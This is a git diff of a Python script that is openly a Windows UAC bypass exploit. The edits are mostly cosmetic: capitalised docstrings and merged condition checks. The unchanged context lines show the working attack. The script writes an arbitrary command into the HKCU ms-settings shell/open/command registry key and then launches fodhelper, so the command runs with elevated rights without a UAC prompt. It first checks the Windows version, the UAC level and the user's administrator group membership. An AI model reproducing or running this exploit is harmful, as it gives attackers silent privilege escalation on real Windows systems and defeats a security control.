@@ -49,7 +49,7 @@ def is_uac_status_verified():
     """UAC status verifier.
     Checks whether the UAC is enabled and its level is set to default.
 
-    returns True if yes and False if not.
+    Returns True if yes and False if not.
 
     """
     print("Checking for UAC status...")
@@ -92,7 +92,7 @@ def is_sids_verified():
 
     Verifies whether the current user is in the administrators group and the mandatory level (integrity level) is not low.
 
-    return True if yes and False if not.
+    Return True if yes and False if not.
 
     """
     print("Checking if the user is in the administrators group...")
@@ -113,9 +113,9 @@ def is_sids_verified():
     return False
 
 def exploit(command_to_execute):
-    """vulnerabilty exploitation.
+    """Vulnerabilty exploitation.
 
-    if all the conditions for this vulnerability are verified then this function called to exploit the vulnerability by passing the command that needs to bypass UAC to get executed.
+    If all the conditions for this vulnerability are verified then this function called to exploit the vulnerability by passing the command that needs to bypass UAC to get executed.
 
     """
     windir = os.getenv('windir')
@@ -125,9 +125,6 @@ def exploit(command_to_execute):
     subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d "'+command_to_execute+'" /f', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     os.system(run_fodhelper)
-    print("exploited successfully.")
-
-    return True
 
 def is_admin_privilege():
     """Privilege checker.
@@ -150,9 +147,9 @@ if __name__ == "__main__":
     if len(sys.argv)> 1:
         if not is_admin_privilege():
             if is_os_compatible():
-                if is_uac_status_verified():
-                    if is_sids_verified():
-                        exploit(sys.argv[1])
+                if is_uac_status_verified() and is_sids_verified():
+                    exploit(sys.argv[1])
+                    print("exploited successfully.")
             else:
                 print("Error windows version is not supported.")
         else:
